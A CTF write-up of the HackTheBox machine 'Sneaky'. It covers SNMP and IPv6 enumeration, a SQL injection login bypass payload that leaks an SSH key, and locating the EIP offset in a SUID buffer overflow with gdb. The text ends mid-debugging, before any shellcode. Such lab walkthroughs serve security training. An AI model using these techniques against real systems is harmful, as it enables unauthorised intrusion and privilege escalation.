---
title: HTB: Sneaky
url: https://0xdf.gitlab.io/2021/03/02/htb-sneaky.html
date: 2021-03-02T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-sneaky, ctf, nmap, udp, snmp, mibs, gobuster, sqli, injection, auth-bypass, onesixtyone, snmpwalk, ipv6, suid, bof, pwn, reverse-engineering, ghidra, gdb, shellcode
---

![Sneaky](https://0xdfimages.gitlab.io/img/sneaky-cover.png)

Sneaky presented a website that after some basic SQL injection, leaked an SSH key. But SSH wasn’t listening. At least not on IPv4. I’ll show three ways to find the IPv6 address of Sneaky, and then SSH using that address to get user. For root, there’s a simple buffer overflow with no protections. I’ll show a basic attack, writing shellcode onto the stack and then returning into it.

## Box Info

| Name | [Sneaky](https://hackthebox.com/machines/sneaky)  [Sneaky](https://hackthebox.com/machines/sneaky) [Play on HackTheBox](https://hackthebox.com/machines/sneaky) |
| --- | --- |
| Release Date | 14 May 2017 |
| Retire Date | 11 Nov 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Sneaky |
| Radar Graph | Radar chart for Sneaky |
| First Blood User | 03:14:00[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 03:45:01[vagmour vagmour](https://app.hackthebox.com/users/82) |
| Creator | [trickster0 trickster0](https://app.hackthebox.com/users/169) |

## Recon

### nmap

#### TCP

`nmap` found one HTTP on TCP 80 open:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 20:26 EST
Nmap scan report for 10.10.10.20
Host is up (0.014s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
oxdf@parrot$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 20:29 EST
Nmap scan report for 10.10.10.20
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds

```

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) version, the host is likely running Ubuntu 14.04 Trusty.

#### UDP

I always run a UDP port scan as well, but typically don’t show it when it doesn’t matter. I ran it here, and it reported nothing:

```

oxdf@parrot$ sudo nmap -p- -sU --min-rate 10000 -oA scans/nmap-alludp 10.10.10.20
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 20:38 EST
Warning: 10.10.10.20 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.20
Host is up (0.015s latency).
All 65535 scanned ports on 10.10.10.20 are open|filtered (65457) or closed (78)

```

The results show that 65457 ports reported `open|filtered`. That’s not helpful at all.

UDP scans are very unreliable. When you do a TCP scan, it sends a SYN packet to the port. The port can either send a SYN/ACK (open), a RST (closed), or not respond. The thing is, if there is a service running on that port, it has to send back a SYN/ACK.

With UDP, there’s no connection set up. The first thing sent is the payload. So `nmap` can guess based on ports various payloads to send and see if the server responses, but it’s quite possible that the server could just ignore the scan packet, and yet when someone trying to use the actual service comes along, it responds normally.

### Website - TCP 80

#### Site

The site just says it’s under development:

![image-20210223143227182](https://0xdfimages.gitlab.io/img/image-20210223143227182.png)

`index.php` doesn’t exist, but `index.html` does, I don’t know much about the site tech stack.

#### Directory Brute Force

I’ll run `gobuster` against the site:

```

oxdf@parrot$ gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-root-small -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.20
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/23 20:32:05 Starting gobuster
===============================================================
/dev (Status: 301)
===============================================================
2021/02/23 20:33:15 Finished
===============================================================

```

#### /dev

Presents a login form:

![image-20210223143429564](https://0xdfimages.gitlab.io/img/image-20210223143429564.png)

When I try root / password, it POSTs to `/dev/login.php`, which returns an unhelpful message:

![image-20210223143508981](https://0xdfimages.gitlab.io/img/image-20210223143508981.png)

### SNMP - UDP 161

At some point, with such a limited attack surface on the host, it’s worth poking at UDP some more, and simple network management protocol (SNMP) is a good place to start.

To interact with SNMP, I’ll need to know a community string (basically a password). It’s very common to have a community string “public” for things that are meant to be publicly available, so I could start by guessing that. But there’s a tool, [onesixtyone](https://github.com/trailofbits/onesixtyone) that will try a bunch of community strings for me against a list of hosts (I only need one). Using their list of common community strings, I find Sneaky is using public:

```

oxdf@parrot$ onesixtyone 10.10.10.20 -c /usr/share/doc/onesixtyone/dict.txt 
Scanning 1 hosts, 51 communities
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686

```

Now `snmpwalk` (`apt install snmp`) is useful to enumerate SNMP. SNMP uses this [hierarchical numbering](https://docs.oracle.com/cd/E13203_01/tuxedo/tux90/snmpmref/1tmib.htm) scheme to label all the kinds of data it can hold (and there’s a ton). There’s an add-on package to install to make the output readable. I’ll `apt install snmp-mibs-downloader`, and then comment out the line in `/etc/snmp/snmp.conf` (it tells you which line in the file comments).

This `snmpwalk` will generate a ton of data, so I’ll run it into a file, so I can search around:

```

oxdf@parrot$ snmpwalk -v2c -c public 10.10.10.20 > scans/snmpwalk-full

```

There’s information on all the running processes and their command lines. There’s hardware information. But the bit I need for Sneaky is the IPv6 address:

```

IP-MIB::ipAddressSpinLock.0 = INTEGER: 1600098099
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.20" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.255" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."127.0.0.1" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:be:08" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:be:08" = INTEGER:

```

dead:beef:0000:0000:0250:56ff:feb9:be08 is the globally routable address, and fe80:0000:0000:0000:0250:56ff:feb9:be08 is the link-local address.

This address will change on each boot because of how HTB has the machines spawn in the lab (MACs aren’t consistent). I wrote a one-liner to capture the IPv6:

```

oxdf@parrot$ snmpwalk -v2c -c public 10.10.10.20 ipAddressIfIndex.ipv6 | cut -d'"' -f2 | grep 'de:ad' | sed -E 's/(.{2}):(.{2})/\1\2/g'
dead:beef:0000:0000:0250:56ff:feb9:3abb

```

Adding `ipAddressIfIndex.ipv6` to the end of the `snmpwalk` will return just the three lines with three ips:

```

oxdf@parrot$ snmpwalk -v2c -c public 10.10.10.20 ipAddressIfIndex.ipv6
IP-MIB::ipAddressIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:3a:bb" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:3a:bb" = INTEGER: 2 

```

The `cut` isolates the IPs between the `"`. The `grep` gives me only the routable one. Then the `sed` finds instances of `xx:xx` and replaces it with `xxxx` using regex.

I dropped that into a shell script for easy use later:

```

oxdf@parrot$ ./get_ipv6.sh 
dead:beef:0000:0000:0250:56ff:feb9:3abb

```

### Alternative Methods for Finding IPv6

There are alternative methods for finding the IPv6 address if you can get on the same network as the host you’re trying to enumerate. Looking at active machines in my my lab, Sneaky is turned on, and I know the shell there is relatively easy, so I’ll start there.

#### From ARP

One thing to know about IPv6 addresses is that they are typically constructed from the machines physically address, the MAC address. In IPv4, ARP is the protocol that maps IPs to MAC addresses. I can look at the local ARP cache on Nibbles, and it shows the gateway:

```

nibbler@Nibbles:/$ arp -a          
? (10.10.10.2) at 00:50:56:b9:dc:3a [ether] on ens192

```

I’ll ping Sneaky so that the two boxes exchange ARP information, and dump the cache again:

```

nibbler@Nibbles:/$ ping -c 1 10.10.10.20
PING 10.10.10.20 (10.10.10.20) 56(84) bytes of data.
64 bytes from 10.10.10.20: icmp_seq=1 ttl=64 time=0.196 ms
--- 10.10.10.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.196/0.196/0.196/0.000 ms
nibbler@Nibbles:/$ arp -a          
? (10.10.10.20) at 00:50:56:b9:be:08 [ether] on ens192
? (10.10.10.2) at 00:50:56:b9:dc:3a [ether] on ens192

```

To convert this MAC to an IPv6 address, there’s a few steps. I’ll demonstrate with Nibbles’:

```

nibbler@Nibbles:/$ ifconfig ens192
ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:2f:74  
          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:2f74/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:2f74/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5782 errors:0 dropped:132 overruns:0 frame:0
          TX packets:17663 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:716466 (716.4 KB)  TX bytes:1899267 (1.8 MB)

```

Start with the network address, in this case either `fe80` or `dead:beef` for link-local or global. Now come the first three bytes of the MAC, except the second lowest bit (2s) in the first byte is flipped. So 00 –> 02, then 50, 56. Then add ff, fe, and then the next three in the MAC.

dead:beef::0250:56ff:feb9:2f74 is the globally routable address, and fe80::0250:56ff:feb9:2f74, just like I see in the `ifconfig` output.

Since I got the MAC for Sneaky of 00:50:56:b9:be:08, the glocal IPv6 is dead:beef::250:56ff:feb9:be08 (which matches what I got from SNMP).

#### From IPv6 Neighbor

Similarly from Nibbles, I can do `ip -6 neigh` which is the IPv6 equiv for APR:

```

nibbler@Nibbles:/$ ip -6 neigh
fe80::250:56ff:feb9:dc3a dev ens192 lladdr 00:50:56:b9:dc:3a router STALE

```

I’ll send an IP ping to the link-local multicast address (I’ll have to specify the interface I want to ping to come from):

```

nibbler@Nibbles:/$ ping6 -I ens192 -c 1 ff02::1
PING ff02::1(ff02::1) from fe80::250:56ff:feb9:2f74 ens192: 56 data bytes
64 bytes from fe80::250:56ff:feb9:2f74: icmp_seq=1 ttl=64 time=0.046 ms
--- ff02::1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms

```

I only get a response from myself, but that’s because there are firewall rules blocking the other incoming. If I check `ip -6 neigh`, each of the active Linux hosts in my lab are now there:

```

nibbler@Nibbles:/$ ip -6 neigh
fe80::250:56ff:feb9:49d7 dev ens192 lladdr 00:50:56:b9:49:d7 STALE
fe80::250:56ff:feb9:4bcc dev ens192 lladdr 00:50:56:b9:4b:cc STALE
fe80::250:56ff:feb9:be08 dev ens192 lladdr 00:50:56:b9:be:08 STALE
fe80::250:56ff:feb9:4b13 dev ens192 lladdr 00:50:56:b9:4b:13 STALE
fe80::250:56ff:feb9:dc3a dev ens192 lladdr 00:50:56:b9:dc:3a router STALE
fe80::250:56ff:feb9:9a33 dev ens192 lladdr 00:50:56:b9:9a:33 STALE

```

Now I can check each of these (converting to their dead:beef:: equiv) in Firefox looking for the Sneaky page. The first one is Admirer:

![image-20210223174016510](https://0xdfimages.gitlab.io/img/image-20210223174016510.png)

The third one is Sneaky:

![image-20210223174047468](https://0xdfimages.gitlab.io/img/image-20210223174047468.png)

### IPv6 nmap

Now with the IPv6 address, I’ll scan again, this time finding SSH (TCP 22) open as well as HTTP (TCP 80):

```

oxdf@parrot$ nmap -6 -p- --min-rate 10000 -oA scans/nmap6-alltcp dead:beef::250:56ff:feb9:be08
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 20:40 EST
Nmap scan report for dead:beef::250:56ff:feb9:be08
Host is up (0.054s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
oxdf@parrot$ nmap -6 -p 22,80 -sCV -oA scans/nmap6-tcpscripts dead:beef::250:56ff:feb9:be08
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 20:41 EST
Nmap scan report for dead:beef::250:56ff:feb9:be08
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)
|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)
|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)
|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:b9:be:08
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds

```

I already checked above and saw the HTTP site was the same.

## Shell as thrasivoulos

### SQL Injection

At the login page, one thing to test is putting special characters into the fields. When I try to login with username `root'`, the result is different:

![image-20210223203529033](https://0xdfimages.gitlab.io/img/image-20210223203529033.png)

This is a good sign for SQL injection. I’m going to guess that the site is running a query that looks something like:

```

SELECT * from users where username = '{name}' and password = '{pass}';

```

When I send `root'`, it breaks the syntax:

```

SELECT * from users where username = 'root'' and password = 'password';

```

So I’ll try a basic authentication bypass, `' or 1=1;-- -`:

```

SELECT * from users where username = '' or 1=1;-- -' and password = 'password';

```

The `-- -` comments out the rest of the line. It let’s me in:

![image-20210223203848328](https://0xdfimages.gitlab.io/img/image-20210223203848328.png)

The link returns an SSH key:

![image-20210223203906706](https://0xdfimages.gitlab.io/img/image-20210223203906706.png)

If I hadn’d already looked at IPv6, this would be a good hint to go back and find it. Rarely is a CTF going to give you an SSH key you can’t use.

### SSH

With the key, I can login over SSH using IPv6:

```

oxdf@parrot$ ssh -i ~/keys/sneaky_thrasivoulos thrasivoulos@dead:beef::250:56ff:feb9:be08
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)
 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Feb 23 21:23:39 EET 2021

  System load: 0.0               Memory usage: 4%   Processes:       176
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$

```

And grab `user.txt`:

```

thrasivoulos@Sneaky:~$ cat user.txt
9fe14f76************************

```

It also works using the `get_ipv6.sh` script:

```

oxdf@parrot$ ssh -i ~/keys/sneaky_thrasivoulos thrasivoulos@$(./get_ipv6.sh)
...[snip]...
thrasivoulos@Sneaky:~$

```

## Shell as root

### Enumeration

There’s a SUID binary owned by root that looks interesting:

```

thrasivoulos@Sneaky:~$ find / -perm -2000 -ls 2>/dev/null | grep -v cache         
...[snip]...
787505    8 -rwsrwsr-x   1 root     root         7301 May  4  2017 /usr/local/bin/chal
...[snip]...

```

Just running it coredumps:

```

thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)

```

If I give it an argument, it just returns without a crash:

```

thrasivoulos@Sneaky:~$ /usr/local/bin/chal test

```

If I pass in a long argument, it crashes again:

```

thrasivoulos@Sneaky:~$ /usr/local/bin/chal $(python -c 'print("A"*500)')
Segmentation fault (core dumped)

```

`ltrace` shows a `strcpy` of my input:

```

thrasivoulos@Sneaky:~$ ltrace chal abcd
__libc_start_main(0x804841d, 2, 0xbffff794, 0x8048450 <unfinished ...>
strcpy(0xbffff592, "abcd")                                = 0xbffff592
+++ exited (status 0) +++

```

`strcpy` isn’t a safe function, and is likely the cause of the crash above if I send more input than fits the buffer at 0xbffff592.

I’ll grab a copy:

```

oxdf@parrot$ scp -i ~/keys/sneaky_thrasivoulos thrasivoulos@[$(./get_ipv6.sh)]:/usr/local/bin/chal .
chal              100% 7301   365.0KB/s   00:00

```

### Static Analysis

I’ll open it in Ghidra, and it finds the `main` function to be very simple:

```

int main(int argc,char **argv)

{
  char buffer [362];
  
  strcpy(buffer,argv[1]);
  return 0;
}

```

That explains the two crashes. With no args, it crashes trying to access `argv[1]`. With an arg too long, it will run over the length of `buffer` and probably overwrite the return address.

### Protections

As it’s looking like a this box is vulnerable to a buffer overflow, it’s worth understanding the protections are in place. On the host, it looks like ASLR is disabled:

```

thrasivoulos@Sneaky:~$ cat /proc/sys/kernel/randomize_va_space 
0

```

At the binary itself, basically all protections are disabled as well:

```

oxdf@parrot$ checksec chal
[*] '/media/sf_ctfs/hackthebox/sneaky-10.10.10.20/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

### Exploit Strategy

It is very uncommon to see hosts without ASLR or NX today. This was much more common 10 years ago. But it gives me a chance to show a strategy for binary exploitation that I haven’t shown before - Overwriting shellcode on the stack and then jumping to it.

I’m going to find the number of bytes to write such that I overwrite the return address, and gain control of `$EIP`. Because there’s no address space layour randomization, I can predict where the stack will be. Because there’s no DEP (NX), I can execute from the stack. I’ll put my shellcode onto the stack, and then jump to it.

### Find EIP Offset

First I need to find the number of characters to write to such that an address I control ends up as the return address for `main`. I’ll create a pattern that’s 500 bytes long (since that led to a crash when testing earlier):

```

oxdf@parrot$ msf-pattern_create -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

```

I’ll start `gdb`, and feed it that string:

```

gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Starting program: /media/sf_ctfs/hackthebox/sneaky-10.10.10.20/chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd210 ("q2Aq3Aq4Aq5Aq")
EDX: 0xffffce09 ("q2Aq3Aq4Aq5Aq")
ESI: 0xf7fa4000 --> 0x1e4d6c 
EDI: 0xf7fa4000 --> 0x1e4d6c 
EBP: 0x6d41396c ('l9Am')
ESP: 0xffffcd90 ("Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
EIP: 0x316d4130 ('0Am1')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x316d4130
[------------------------------------stack-------------------------------------]
0000| 0xffffcd90 ("Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0004| 0xffffcd94 ("m3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0008| 0xffffcd98 ("4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0012| 0xffffcd9c ("Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0016| 0xffffcda0 ("m7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0020| 0xffffcda4 ("8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0024| 0xffffcda8 ("An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
0028| 0xffffcdac ("n1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x316d4130 in ?? ()

```

`$EIP` is set to 0x316d4130, or ‘0Am1’. I’ll feed that back into `msf-pattern_offset` to get the offset:

```

oxdf@parrot$ msf-pattern_offset -q 0Am1
[*] Exact match at offset 362

```

I can test this by putting in a string of 362 “A” followed by “BBBB”. If things are working as I expect, then `$EIP` should be BBBB, or 0x42424242, at the crash:

```

oxdf@parrot$ python -c 'print("A"*362 + "BBBB")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
oxdf@parrot$ gdb -q chal
Reading symbols from chal...
(No debugging symbols found in chal)
gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Starting program: /media/sf_ctfs/hackthebox/sneaky-10.10.10.20/chal AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd210 ("AAAAAAAAABBBB")
EDX: 0xffffce03 ("AAAAAAAAABBBB")
ESI: 0xf7fa4000 --> 0x1e4d6c 
EDI: 0xf7fa4000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffce10 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffce10 --> 0x0 
0004| 0xffffce14 --> 0xffffceb4 --> 0xffffd07d ("/media/sf_ctfs/hackthebox/sneaky-10.10.10.20/chal")
0008| 0xffffce18 --> 0xffffcec0 --> 0xffffd21e ("SHELL=/bin/bash")
0012| 0xffffce1c --> 0xffffce44 --> 0x0 
0016| 0xffffce20 --> 0xffffce54 --> 0xbe8739d7 
0020| 0xffffce24 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
0024| 0xffffce28 --> 0xf7fcb410 --> 0x804825e ("GLIBC_2.0")
